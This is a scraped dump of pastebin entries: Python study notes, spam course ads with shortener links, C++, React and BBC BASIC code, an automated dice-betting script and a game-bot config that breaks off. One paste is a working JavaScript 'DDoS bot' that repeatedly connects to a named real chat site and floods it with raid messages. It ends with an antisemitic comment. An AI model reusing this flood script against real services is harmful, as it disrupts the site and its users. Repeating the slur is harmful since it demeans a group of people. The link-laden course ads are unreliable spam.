# Prac Tests, Ch 33 and 34... more than the Pre

# Use Submit Mode and get them to 100%!!!
# PAY ATTENTION to the unit tests!
# ... then UNIT TEST more! Unit test, unit test, unit test!

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Comp 2: Control Flow
# Comp 3: Modules and Files

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Operators
# = # assigns
# == # asking a question? A condition
# +
# -
# *
# /
# % # modulo... whole number remainder... ""how many whole things didn't fit since the last even division?""
# // # floor division... the last even division
# <
# >
# <=
# >=
# += # x += 1 ... x = x + 1
# -=
# ** # compare to pow(), math.pow()
# !=
# # keyword
# in # if x in myList
# not # if not x in myList
# and
# or # any one True means the combo is True...limit OR to 2-3 conditions

# Data Types/Classes
# int
# floats
# bool # True, False
# str # """"
# list # [ ]
# dict # {key: value}
# tuple # ( ) immutable, Python see a,b,c as (a,b,c) --> return x,y --> return (x,y)
# set # { } no duplicates, unordered --> no index, no slicing, no sort, no reverse
# range # range()... container of consecutive numbers --> range(start, stop, step)
# file # open()... f.read(), f.readlines(), f.write()

# Comp 2
# Control Flow! The how and when of our programs
# IF statements... if, if/else, if/elif, if/elif/else, etc
# LOOPS
# WHILE - - an IF that repeats
# FOR - looping over a container, or known number of times... hence range()
# # Check out my For Loops webinar in The Gotchas
# for ___ in __someContainer__:
# for item in myList:
# for char in myStr:
# for key in myDict: # myDict[key]
# for n in range(5):
# for i in range(0, len(myList)): # myList[i]
# for i, item in enumerate(myList):

# FUNCTIONS
# defining/writing a function vs calling
# modular... a function has ONE job
# return statements
# parameters are special variables for holding stuff coming into the function
# parameters vs arguments
# pay attention to whether the function is asked to return or print()/output
#
# def someFunction(x, y):
#     return x // y
#
# if __name__ == ""__main__"": # is this script the one that's running now
#     # inside this block we're answering this specific question
#     input1 = int(input())
#     input2 = int(input())
#     myNum = someFunction(input1, input2)
#     print(myNum)

# See ""tasks"" in the last section of Ch 10, 11, 13, 14 for function writing practice
# CodingBat also has good function-based Python questions:
# https://codingbat.com/python

# BUILT-IN FUNCTIONS
# input()
# print()
# len()
# min()
# max()
# sum()
# pow()
# abs()
# round() # cousins math.floor() and math.ceil()
# enumerate()
# int()
# float()
# list()
# range()
# str()
# dict()
# tuple()
# chr()
# ord()
# open()
# sorted() # different from list.sort()
# reversed() # different from list.reverse()
# type() # print(type(myVar).__name__)
# help()
# dir()
# help(str)
# print(dir(str))
# help(str.isspace)

# STRINGS
# be able to refer to indices, and slice
# mySlice[start:stop:step]
# myStr = ""abcd""
# revStr = myStr[::-1]
# print(revStr)

# KNOW YOUR WHITESPACE
# "" "" # space from spacebar
# # a lot of Unicode spaces
# '\n' # new line return
# ""\t"" # tab
# ""\r"" # carriage return

# STRING METHODS
# myStr.format() # ""Stuff I want to put together in this string like {:.2f}"".format(myVar)
# myStr.strip() # input().strip()
# myStr.split() # returns a list of smaller strings
# "","".join(listOfStrings)
# myStr.replace(subStr, newStr) # remove myStr = myStr.replace(subStr, """")
# myStr.index(subStr), myStr.find(subStr) # return index where found
# myStr.count(subStr) # return number of occurrences
# case: myStr.lower(), myStr.upper(), myStr.capitalize(), myStr.title()
# is/Boolean: myStr.islower(), myStr.isspace(), myStr.isalpha(), myStr.isdigit(), myStr.isnumeric(), myStr.isalnum()
# myStr.startswith(subStr), myStr.endswith(subStr)

# LISTS
# be able to refer by index and to slice
# LIST METHODS
# +
# myList.append(item)
# myList.insert(i, item)
# myList.extend(anotherList)
# -
# myList.pop(i)
# myList.remove(item) # pop() by index, remove() by value
# myList.clear()
# # other
# myList.sort()
# myList.reverse()
# myList.count(item)
# myList.index(item)

# DICT
# # use the key like an index []... then you don't really need DICT methods
# myDict[key] # get the value for that key --> similar to myDict.get()
# myDict[key] = value # assigns new value to key --> similar to myDict.update({k:v})
# DICT METHODS
# myDict.keys()
# myDict.values()
# if ""this"" in myDict: # membership check on a dict looks at keys
# if ""that"" in myDict.values():
# myDict.items() # for k, v in myDict.items()

# MODULES
# math and csv

# MATH MODULE
# import math # ""full import""
# math.factorial(x)
# math.ceil(x)
# math.floor(x)
# math.sqrt(x)
# math.pow(x, y)
# math.fabs(x)
# math.pi
# math.e

# PARTIAL IMPORT
# from math import sqrt # --> sqrt()
# from math import floor, ceil --> floor(), ceil()
# from math import * # floor(), sqrt()

# ALIAS IMPORT
# import math as m # --> m.floor(), m.factorial()

# FILES
# modes: r, w, a

# READ MODE
# with open(""test.txt"", ""r"") as f:
#     # f.read() # returns whole file as one big string
#     # f.readlines() # returns a list of strings, line by line
#     # f.write() # take one str arg and write into file (can't do here bc I'm in read mode)
#     contents = f.readlines()

# for line in contents:
#     line = line.strip()
#     print(line) # print(line, end=""\n"")
# print(contents)

# CSV Module
import csv # csv.reader()
with open(""mock_data.csv"", ""r"") as f1: # mockaroo.com
    contents = list(csv.reader(f1)) # csv.reader(f1, delimiter=""\t"") if a tsv
# print(contents[0:20])

# WRITE MODE
# let's write out a file with just rows where the last name started with H
# with open(""output_data32.csv"", 'w') as f2:
#     for row in contents:
#         # last name is position 2... row[2]
#         # lastName = row[2]
#         if row[2].startswith(""H"") or row[2].startswith(""h""):
#         # if row[2].lower().startswith(""h""):
#         # if row[2][0].lower() == ""h"":
#             f2.write("","".join(row) + ""\n"")

# APPEND MODE
# with open(""append_to_this.txt"", ""r"") as f3:
#     print(f3.readlines())

# ['Frodo\n', 'Sam\n', 'Merry'] # no final line return in this file tells me how to end my file's last line
with open(""append_to_this.txt"", ""a"") as f3:
    f3.write(""\nPippin"")


"
WGJTY3ni,Untitled,f0f077,MySQL,Saturday 20th of January 2024 04:57:31 PM CDT,"[NEW] Spring Boot 3, Spring 6 & Hibernate for Beginners
Spring Boot 3: Learn Spring 6, Spring Core, Spring REST, Spring MVC, Spring Security, Thymeleaf, JPA, Hibernate, MySQL
LEARN these HOT TOPICS in Spring Boot 3 and Spring 6:

Spring Boot 3

Spring Framework 6

Spring Boot 3 Core

Spring Boot 3 Annotations

Spring Boot 3 Java Configuration (all Java, no xml)

Spring Boot 3 and Spring MVC

Spring Boot 3 Hibernate/JPA CRUD

Spring Boot 3 Security

Spring Boot 3 REST API

Maven
for more:https://linkjust.com/cYp7yx0igMfWoRSSY0xWOxRPxx7tf
"
ipy21dWs,Untitled,f0f077,Java,Saturday 20th of January 2024 04:52:10 PM CDT,"Java and Spring Framework 6 with Spring Boot 3
Master Java, Spring 6 and Spring Boot 3 with JDBC, JPA, Maven, Docker and Microservices
Core Java
Spring Boot
Spring Core - IoC
Spring MVC
Spring AOP
Spring Data JPA
Spring REST
Spring Security
Docker
Top companies offer this course to their employees
for more:https://dz-linkk.com/AonbaR"
0hViixxS,Untitled,f0f077,Java,Saturday 20th of January 2024 04:48:23 PM CDT,"Java from Zero to First Job, Practical Guide, 2000+ examples
Java Core, TDD, Streams, Lambdas, JPA/Hibernate, SQL, Build Tools, Git, Web Servers, HTML,Servlets, JSP, Spring Boot etc
Learn the Java basics, including syntax and primitive data types
Get necessary knowledge to demonstrate your skills of Java to future employers
Students will learn programming basics which will help them to understand any other programming language
Interview practice tests
In this course you will get knowledge which is
for more:https://dz-linkk.com/28uo1"
Lnajixqx,Chuchel DDOS Bot,KwekFantic,JavaScript,Saturday 20th of January 2024 04:33:14 PM CDT,"{
    setInterval(() => {
        const socket = io(""https://bonziworld.org/"");
        socket.emit(""client"", ""MAIN"");
        socket.emit(""login"", {
            passcode: """",
            name: ""Chuchel DDoS bot"",
            room: ""default"",
        });
        socket.emit(""command"", {
            list: [""color"", ""https://cdn.discordapp.com/attachments/1132221617934717074/1197938507927261264/image.png?ex=65bd162c&is=65aaa12c&hm=3e75b2d4488c3baeaa6f53016a6593a77265303f6085a1ca0af003e1d6445ba4&""]
        })
        setTimeout(()=>{
            javascript:setInterval(function(){socket.emit('talk', {text:""THIS SERVER HAS BEEN RAIDED BY CHUCHEL DDOS BOT "" + Math.random() * 720})});
            javascript: setInterval(function(){socket.emit('command',{list:[""name"",""Chuchel DDoS bot "" + Math.random() * 720]})}, 40);
            socket.on('talk',function(data){v = ""I HATE BFDI SO MUCH! ""+ Math.random() * 1000000;
            socket.emit(""quote"",{msg:v.toString(),guid:data.guid});});
        }, 2500);
    },3000)
}
// only for hacker jews who love to hack this website for free
// don't try this at risk"
uDktERw5,Untitled,a_chn,C++,Saturday 20th of January 2024 04:17:26 PM CDT,"#include <bits/stdc++.h>
using namespace std;
 
int n;
bool ans;
int grid[505][505];
bool visited[505][505];
int dir[4][2] = {{-1, 0}, {0, -1}, {1, 0}, {0, 1}};
int maxi = 0;
bool valid(int x, int y, int m, int a, int b) {
    return x < n && x >= 0 && y < n && y >= 0 && !visited[x][y] && abs(grid[x][y]-grid[a][b]) <= m;
}
 
bool bfs(int m) {
    for(int ii = 0; ii < n; ii++) for(int jj = 0; jj < n; jj++) {
        visited[ii][jj] = false;
    }
    for(int i = 0; i < n; i++) for(int j = 0; j < n; j++) if(!visited[i][j]) {
        queue<array<int, 2> > q;
 
        q.push({i, j});
        visited[i][j] = true;
        int c = 1;
 
        while(!q.empty()) {
 
            array<int, 2> temp = q.front();
            q.pop();
            int tx = temp[0], ty = temp[1];

            for(int ii = 0; ii < 4; ii++) {
                int nx = tx+dir[ii][0], ny = ty+dir[ii][1];
                if(valid(nx, ny, m, tx, ty)) {
                    ++c;
                    visited[nx][ny] = true;
                    q.push({nx, ny});
                }
            }
        }
 
        if(c >= (n * n + 1) / 2) {
            return true;
        } 
 
    }
    return false;
 
}
 void setIO(string s) {
	ios_base::sync_with_stdio(0);
	cin.tie(0);
	freopen((s + "".in"").c_str(), ""r"", stdin);
	freopen((s + "".out"").c_str(), ""w"", stdout);
}
 
int main() {
    setIO(""tractor"");
    cin >> n;
    for(int i = 0; i < n; i++) for(int j = 0; j < n; j++) {
        cin >> grid[i][j];
        maxi = max(maxi, grid[i][j]);
    }
 
 
    int left = 0, right = maxi;
 
    while(left < right) {
 
        int mid = (left + right) / 2;
        if(!bfs(mid)) {
            left = mid + 1;
        }
        else {
            right = mid;
        }
 
    }
 
    cout << left << endl;
}
 "
rf6Sx0s8,DraggableTest2,PuriDevelopers,TypeScript,Saturday 20th of January 2024 04:14:52 PM CDT,"import React, { useRef, useEffect } from 'react';
import interact from 'interactjs';

interface ResizableIframeProps {
  windowIndex: number;
  iframeSrc: string;
}

const ResizableIframe: React.FC<ResizableIframeProps> = ({ windowIndex, iframeSrc }) => {
  const resizableRef = useRef<HTMLDivElement>(null);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const handleResizeStart = (event: any) => {
    const target = event.target;
    target.setAttribute('data-x', target.offsetLeft);
    target.setAttribute('data-y', target.offsetTop);

    iframeRef.current?.style.setProperty('pointer-events', 'none');
  };

  const handleResizeMove = (event: any) => {
    const target = event.target;
    const x = parseFloat(target.getAttribute('data-x')) || 0;
    const y = parseFloat(target.getAttribute('data-y')) || 0;

    if (resizableRef.current) {
      resizableRef.current.style.width = event.rect.width + 'px';
      resizableRef.current.style.height = event.rect.height + 'px';

      const newX = x + event.deltaRect.left;
      const newY = y + event.deltaRect.top;

      resizableRef.current.style.transform = `translate(${newX}px, ${newY}px)`;

      target.setAttribute('data-x', newX.toString());
      target.setAttribute('data-y', newY.toString());
    }
  };

  const handleResizeEnd = () => {
    iframeRef.current?.style.setProperty('pointer-events', 'auto');
  };

  const handleDragMoveStart = () => {
    iframeRef.current?.style.setProperty('pointer-events', 'none');
  };

  const handleDragMoveEnd = () => {
    iframeRef.current?.style.setProperty('pointer-events', 'auto');
  };

  const dragMoveListener = (event: any) => {
    const target = resizableRef.current;
    const x = (parseFloat(target?.getAttribute('data-x')) || 0) + event.dx;
    const y = (parseFloat(target?.getAttribute('data-y')) || 0) + event.dy;

    target?.style.transform = 'translate(' + x + 'px, ' + y + 'px)';

    target?.setAttribute('data-x', x.toString());
    target?.setAttribute('data-y', y.toString());
  };

  useEffect(() => {
    if (resizableRef.current) {
      interact(resizableRef.current)
        .resizable({
          edges: { bottom: true, right: true },
          restrictEdges: {
            outer: 'parent',
            endOnly: true,
          },
          restrictSize: {
            min: { width: 50, height: 50 },
          },
          inertia: true,
        })
        .on('resizestart', handleResizeStart)
        .on('resizemove', handleResizeMove)
        .on('resizeend', handleResizeEnd);

      const draggableRef = resizableRef.current.querySelector('.draggable-window');
      if (draggableRef) {
        interact(draggableRef)
          .draggable({
            inertia: true,
            modifiers: [
              interact.modifiers.restrictRect({
                restriction: 'parent',
                endOnly: true,
              }),
            ],
            autoScroll: true,
            listeners: {
              move: dragMoveListener,
            },
          })
          .on('dragstart', handleDragMoveStart)
          .on('dragend', handleDragMoveEnd);
      }
    }
  }, []);

  return (
    <div className=""window"" ref={resizableRef} style={{ transform: 'translate(0px, 0px)' }}>
      <div className=""border-window"">
        <div className=""draggable-window"">Draggable frame {windowIndex}</div>
        <embed src={iframeSrc} ref={iframeRef}></embed>
      </div>
    </div>
  );
};

export default ResizableIframe;"
6n5TxbCJ,DraggableTest,PuriDevelopers,JavaScript,Saturday 20th of January 2024 04:03:47 PM CDT,"import React, { useRef, useEffect } from 'react';
import interact from 'interactjs';

const ResizableIframe: React.FC = () => {
  const resizableRefs = useRef<Array<HTMLDivElement | null>>([]);
  const iframeRefs = useRef<Array<HTMLIFrameElement | null>>([]);

  const handleResizeStart = (event: any) => {
    const target = event.target;
    target.setAttribute('data-x', target.offsetLeft);
    target.setAttribute('data-y', target.offsetTop);

    const index = resizableRefs.current.indexOf(target);
    iframeRefs.current[index]?.style.setProperty('pointer-events', 'none');
  };

  const handleResizeMove = (event: any) => {
    const target = event.target;
    const x = parseFloat(target.getAttribute('data-x')) || 0;
    const y = parseFloat(target.getAttribute('data-y')) || 0;

    const index = resizableRefs.current.indexOf(target);
    if (resizableRefs.current[index]) {
      resizableRefs.current[index].style.width = event.rect.width + 'px';
      resizableRefs.current[index].style.height = event.rect.height + 'px';

      const newX = x + event.deltaRect.left;
      const newY = y + event.deltaRect.top;

      resizableRefs.current[index].style.transform = `translate(${newX}px, ${newY}px)`;

      target.setAttribute('data-x', newX.toString());
      target.setAttribute('data-y', newY.toString());
    }
  };

  const handleResizeEnd = () => {
    iframeRefs.current.forEach((iframe) => {
      if (iframe) {
        iframe.style.setProperty('pointer-events', 'auto');
      }
    });
  };

  useEffect(() => {
    resizableRefs.current.forEach((resizableRef, index) => {
      if (resizableRef) {
        interact(resizableRef)
          .resizable({
            edges: { bottom: true, right: true },
            restrictEdges: {
              outer: 'parent',
              endOnly: true,
            },
            restrictSize: {
              min: { width: 50, height: 50 },
            },
            inertia: true,
          })
          .on('resizestart', handleResizeStart)
          .on('resizemove', handleResizeMove)
          .on('resizeend', handleResizeEnd);
      }

      const draggableRef = resizableRef?.querySelector('.draggable-window');
      const iframeRef = resizableRef?.querySelector('embed');

      if (draggableRef && iframeRef) {
        interact(draggableRef)
          .draggable({
            inertia: true,
            modifiers: [
              interact.modifiers.restrictRect({
                restriction: 'parent',
                endOnly: true,
              }),
            ],
            autoScroll: true,
            listeners: {
              move: (event) => dragMoveListener(event, index),
            },
          })
          .on('dragstart', () => handleDragMoveStart(index))
          .on('dragend', handleDragMoveEnd);
      }
    });
  }, []);

  const handleDragMoveStart = (index: number) => {
    iframeRefs.current[index]?.style.setProperty('pointer-events', 'none');
  };

  const handleDragMoveEnd = () => {
    iframeRefs.current.forEach((iframe) => {
      if (iframe) {
        iframe.style.setProperty('pointer-events', 'auto');
      }
    });
  };

  const dragMoveListener = (event: any, index: number) => {
    const target = resizableRefs.current[index];
    const x = (parseFloat(target.getAttribute('data-x')) || 0) + event.dx;
    const y = (parseFloat(target.getAttribute('data-y')) || 0) + event.dy;

    target.style.transform = 'translate(' + x + 'px, ' + y + 'px)';

    target.setAttribute('data-x', x.toString());
    target.setAttribute('data-y', y.toString());
  };

  return (
    <>
      <div className=""window"" ref={(el) => (resizableRefs.current[0] = el)} style={{ transform: 'translate(0px, 0px)' }}>
        <div className=""border-window"">
          <div className=""draggable-window"">Draggable frame 1</div>
          <embed src=""https://gummysearch.com/?utm_source=iframetester.com"" ref={(el) => (iframeRefs.current[0] = el)}></embed>
        </div>
      </div>

      <div className=""window"" ref={(el) => (resizableRefs.current[1] = el)} style={{ transform: 'translate(0px, 0px)' }}>
        <div className=""border-window"">
          <div className=""draggable-window"">Draggable frame 2</div>
          <embed src=""https://gummysearch.com/?utm_source=iframetester.com"" ref={(el) => (iframeRefs.current[1] = el)}></embed>
        </div>
      </div>
      {/* Add more windows as needed */}
    </>
  );
};

export default ResizableIframe;"
9Ce7B8dQ,Untitled,f0f077,Python,Saturday 20th of January 2024 03:11:23 PM CDT,"Complete Python Megacourse: Beginner to Expert
Learn how to work with Python with this step-by-step course!
Have you ever wanted to develop a solid programming skillset in Python?

Programming is currently the most important knowledge you could have, and it will be from now on. From developing an app to creating the e-shop for your favorite brands, the things you can do with programming are endless.
for more:https://linkjust.com/MIpW"
5hCcmAvj,Luis_ferrari2,lovejoy777,ZXBasic,Saturday 20th of January 2024 03:06:12 PM CDT,"   10 REM ******************************
   20 REM *        AGON LIGHT 2        *
   30 REM *      BBC BASIC MODE 0      *
   40 REM *            DEMO            *
   50 REM *         640 X 480          *
   60 REM *          DRAWING           *
   70 REM *                            *
   80 REM *      BY STEVE LOVEJOY      *
   90 REM ******************************
  100 :
  110 REM START OF MAIN PROGRAM.
  120 :
  130 PROC_INIT            : REM CALL INIT PROCESS.
  140 RESTORE 6010
  150 PROC_DRAW_CAR
  160 RESTORE 6300
  170 PROC_DRAW_WHEELS
  180 :
 1000 END                 : REM **** END OF MAIN PROGRAM ****
 1010 :
 3090 REM PROCESS DEFINES.
 4000 DEF PROC_INIT       : REM DEFINE INITIAL PROCESS.
 4010 VDU 22,0            : REM SET SCREEN MODE.
 4020 VDU 23,1,0          : REM DISABLE CURSOR.
 4030 VDU 12              : REM SAME AS CLS (clear text from screen).
 4040 VDU 16              : REM SAME AS CLG (clear graphics from screen).
 4050 REM VARS.
 4050 SW% = 1279          : REM SCREEN WIDTH IN GRAPHICAL UNITS.
 4060 SH% = 1023          : REM SCREEN HEIGHT IN GRAPHICAL UNITS.
 4070 SC = 5.0            : REM FLOAT FOR SCALE (PLAY WITH THIS #).
 4080 DX% = SW%/2-400     : REM DEFAULT X START COORDS (center of screen -400).
 4090 DY% = SH%/2-50      : REM DEFAULT Y START COORDS (center of screen -50).
 4100 VDU 18,0,9          : REM SET COLOUR OF GRAPHICS.
 4200 ENDPROC             : REM END INIT PROCESS.
 4500 :
 4510 DEF PROC_DRAW_CAR   : REM DEFINE DRAW PROCESS.
 4520 DIM CXY% (1024)     : REM CAR ARRAY BIG ENOUGH NUMBER TO HOLD ALL DATA.
 4530 :
 4540 REPEAT                    : REM START OF CAR LOOP.
 4550     READ CX%,CY%            : REM GET DATA FOR CX & CY.
 4560     IF CX% >= 0 GOTO 4640  : REM IF CX% IS 0 OR ABOVE DRAW.
 4570         REM SPECIAL VALUES, EITHER MOVE OR END.
 4580         IF CX% = -12345 GOTO 4650                 : REM IF CX IS END MARKER.
 4590           CX% = ABS(CX%)                          : REM IF CX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 4600           CY% = ABS(CY%)                          : REM IF CX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 4610           MOVE DX% + (CX% * SC), DY% + (CY% * SC) : REM **** MOVE CAR ****
 4620           GOTO 4650
 4630     REM ELSE
 4640           DRAW DX% + (CX% * SC), DY% + (CY% * SC) : REM **** DRAW CAR ****
 4650     REM ENDIF
 4660 UNTIL CX% = -12345 AND CY% = -12345               : REM LOOP UNTIL END MARKERS ARE READ.
 4670 :
 4680 ENDPROC                                         : REM END DRAW CAR PROCESS.
 5500 :
 5510 DEF PROC_DRAW_WHEELS       : REM DEFINE DRAW WHEELS PROCESS.
 5520 REM DIM WXY% (1024)        : REM WHEELS ARRAY BIG ENOUGH NUMBER TO HOLD ALL DATA.
 5530 :
 5540 REPEAT                     : REM START OF WHEELS LOOP.
 5550     READ WX%,WY%           : REM GET DATA FOR WX & WY.
 5560     IF WX% >= 0 GOTO 5640  : REM IF WX% IS 0 OR ABOVE = WHEEL RADIUS.
 5570         REM SPECIAL VALUES, EITHER MOVE OR END.
 5580         IF WX% = -12345 GOTO 5650                 : REM IF WX IS END MARKER.
 5590           WX% = ABS(WX%)                          : REM IF WX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 5600           WY% = ABS(WY%)                          : REM IF WX IS A MINUS # MOVE (NOT DRAW), ABS CONVERTS TO POSITIVE #.
 5610           MOVE DX% + (WX% * SC), DY% + (WY% * SC) : REM **** MOVE WHEELS ****
 5620           GOTO 5650
 5630     REM ELSE
 5640           PLOT 145,WX%*SC,0 : REM **** DRAW WHEELS ****
 5650     REM ENDIF
 5660 UNTIL WX% = -12345 AND WY% = -12345               : REM LOOP UNTIL WHEELS END MARKERS ARE READ.
 5670 :
 5680 ENDPROC                                           : REM END DRAW WHEELS PROCESS.
 6000 :
 6010 DATA -5,-11,7,14,1,21,18,27,11,30,11,26,-18,-27,43,33
 6020 DATA 55,35,-49,-34,60,32,-55,-35,60,33,-55,-35,53,26,53,22
 6030 DATA 54,16,55,11,49,11,47,19,43,22,39,24,36,24,35,24
 6040 DATA 30,22,27,19,23,11,5,11,-15,-21,19,21,19,23,15,23
 6050 DATA 15,21,-3,-19,25,19,-55,-11,97,11,99,15,100,19,101,24
 6060 DATA 101,29,100,33,60,33,86,44,85,46,54,35,-47,-19,52,19
 6070 DATA 100,19,-74,-28,111,22,112,24,112,27,111,30,74,28,-75,-33
 6080 DATA 83,41,-101,-33,136,33,113,45,104,47,101,33,-104,-47,125,37
 6090 DATA 124,33,-122,-33,123,38,-119,-33,120,37,-117,-33,118,36,-115,-33
 6100 DATA 116,37,-111,-33,114,39,-109,-33,111,40,-107,-33,109,41,-105,-33
 6110 DATA 107,42,-103,-33,105,43,-136,-33,159,35,113,45,-159,-35,162,37
 6120 DATA 162,24,160,21,157,16,146,12,142,19,158,19,-157,-22,157,24
 6130 DATA 153,24,153,22,157,22,-142,-19,138,23,134,24,131,24,128,24
 6140 DATA 123,23,119,21,117,19,114,11,49,11,-117,-19,100,19,-110,-17
 6150 DATA 103,17,102,15,110,15,110,17,-95,-33,96,35,97,36,98,36
 6160 DATA 99,35,100,33
 6200 DATA -12345,-12345 : REM END DRAW CAR MARKERS.
 6300 DATA -37,-15,9,9,-37,-15,7,7,-37,-15,2,2
 6310 DATA -130,-15,9,9,-130,-15,7,7,-130,-15,2,2
 6500 DATA -12345,-12345 : REM END DRAW WHEELS MARKERS."
NQUBQGs4,Untitled,f0f077,Python,Saturday 20th of January 2024 03:04:23 PM CDT,"2024 Python Bootcamp | Learn Python Programming Masterclass
Complete Python Bootcamp | Learn Python Programming Masterclass with Practical Code (Notes + Source Code) in 99 Days.
If you are thinking to enroll in a Python Bootcamp to enhance your programming skills and learn the latest trends and techniques in Python programming, you are at the right place to make enrollment in Python Bootcamp
for more:https://linkjust.com/dZi8oBzk1H2tWjs9XbY29I4nF"
GTQ6Y5RM,Untitled,f0f077,Python,Saturday 20th of January 2024 02:56:43 PM CDT,"Complete Python Bootcamp For Everyone From Zero to Hero 2024
Master Python Programming by building 100+ REAL PROJECTS . Learn OOP, Automation,GUI,REST and more to create your APPs.
Welcome to Complete Python Bootcamp for Everyone, the best and the most comprehensive Python course on the internet.
for more:https://linkjust.com/YM9SmoUT6YWBsvfwr7Js
"
1aTEY5aF,snowybot,coinwalk,JavaScript,Saturday 20th of January 2024 02:23:35 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/800).toFixed(8));
var bellance = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*5.9);
var eights = (base*6.9);
var muck = 4;
var upper = 5.9;
var downer = 11.9;
var adrian = false;
var bob = oldestbal;
var fart = ((Math.floor(oldestbal/tens))*tens);
var james = ((Math.floor(oldestbal/tens))*tens);
var betnext = ((botplus*1).toFixed(8));
 
 
function get(){
bellance = document.getElementById('pct_balance').value;
var good = ((bellance-oldestbal).toFixed(8));
console.clear();
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    adrian = true;
    fart = parseFloat(bellance);
    bob = parseFloat(bellance);
}
if (bellance<(fart-(botplus*downer))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=(bob-(base*8)))&&(bellance!=fart)){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    adrian = false;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (((bellance-(botplus*2))<=0)&&(bellance!=fart)){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    adrian = false;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if ((botplus>=(base*8))&&(bellance!=fart)){
    botplus = base;
    upper = 5.9;
    downer = 1.9;
    adrian = false;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
}
if (bellance>=(oldestbal*24)) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();"
csD4BiPL,Tar.json,Gruzing,Lua,Saturday 20th of January 2024 02:22:09 PM CDT,"{
  ""looting"": {
    ""items"": [
      {
        ""id"": 5904,
        ""count"": 1
      },
      {
        ""id"": 3595,
        ""count"": 1
      },
      {
        ""id"": 6548,
        ""count"": 2
      },
      {
        ""id"": 3043,
        ""count"": 8
      },
      {
        ""id"": 3420,
        ""count"": 1
      },
      {
        ""id"": 3364,
        ""count"": 1
      },
      {
        ""id"": 3414,
        ""count"": 1
      },
      {
        ""id"": 5802,
        ""count"": 1
      },
      {
        ""id"": 3366,
        ""count"": 1
      },
      {
        ""id"": 3048,
        ""count"": 1
      },
      {
        ""id"": 7382,
        ""count"": 1
      }
    ],
    ""maxDanger"": 10,
    ""minCapacity"": 0,
    ""everyItem"": false,
    ""containers"": [

    ]
  },
  ""targeting"": [
    {
      ""lureMax"": 8,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""dynamicLureDelay"": false,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^wyladowanie$|^spektator$|^rozladowanie$|^nessie$|^junok$|^amok$|^plugastwo$|^lilith$|^wykleta$|^cp guard$"",
      ""lureCavebot"": false,
      ""lureCount"": 4,
      ""danger"": 1,
      ""dontLoot"": false,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""name"": ""wyladowanie, spektator, rozladowanie, nessie, junok, amok, plugastwo, lilith, wykleta, cp guard"",
      ""maxDistance"": 10,
      ""faceMonster"": false,
      ""avoidAttacks"": false,
      ""chase"": false,
      ""anchorRange"": 3,
      ""priority"": 1,
      ""rpSafe"": false,
      ""delayFrom"": 2,
      ""lureDelay"": 322,
      ""closeLureAmount"": 6,
      ""rePositionAmount"": 5,
      ""diamondArrows"": false,
      ""anchor"": false,
      ""keepDistance"": false
    },
    {
      ""lureMax"": 10,
      ""lureMin"": 4,
      ""dynamicLure"": true,
      ""lureDelay"": 538,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^abyss$"",
      ""name"": ""abyss"",
      ""lureCount"": 5,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": false,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 6,
      ""dynamicLureDelay"": true,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^atrox$"",
      ""name"": ""atrox"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
      ""regex"": ""^mr snowman$"",
      ""name"": ""Mr Snowman"",
      ""lureCount"": 1,
      ""danger"": 1,
      ""rePositionAmount"": 5,
      ""lure"": false,
      ""keepDistanceRange"": 1,
      ""lureCavebot"": false,
      ""avoidAttacks"": false,
      ""keepDistance"": false,
      ""diamondArrows"": false,
      ""chase"": true,
      ""dontLoot"": false,
      ""priority"": 1,
      ""rpSafe"": false,
      ""anchorRange"": 3,
      ""delayFrom"": 2,
      ""dynamicLureDelay"": false,
      ""closeLureAmount"": 3,
      ""maxDistance"": 10,
      ""anchor"": false,
      ""faceMonster"": false
    },
    {
      ""lureMax"": 3,
      ""lureMin"": 1,
      ""dynamicLure"": false,
      ""lureDelay"": 250,
      ""closeLure"": false,
      ""rePosition"": false,
